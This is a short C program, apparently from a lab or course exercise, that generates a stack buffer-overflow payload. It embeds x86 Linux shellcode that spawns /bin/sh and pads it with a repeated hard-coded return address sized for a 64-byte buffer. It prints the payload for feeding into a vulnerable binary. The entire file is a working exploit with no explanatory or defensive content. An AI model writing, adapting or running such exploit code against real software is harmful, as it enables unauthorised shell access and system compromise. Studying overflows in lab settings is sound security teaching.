#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void main(int argc, char *argv[])
{
	int buffer_length = 64;
	int extra_offset = 4;
	int i;

	char * shell_string = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
	int shell_string_len = strlen(shell_string);

	int attack_string_length = buffer_length + extra_offset + 20;

	char * attack_string = malloc((attack_string_length+1)*sizeof(char));

	unsigned long addr = 0x0805210e;

	unsigned long * addr_string = (unsigned long *)attack_string;

	
	for (i = 0; i < attack_string_length/4; ++i) {
		*(addr_string++) = addr;
	}

	for (i = 0; i < shell_string_len; ++i) {
		attack_string[i] = shell_string[i];
	}

	
	attack_string[attack_string_length] = 0; // terminate with null

	printf("%s", attack_string);

}
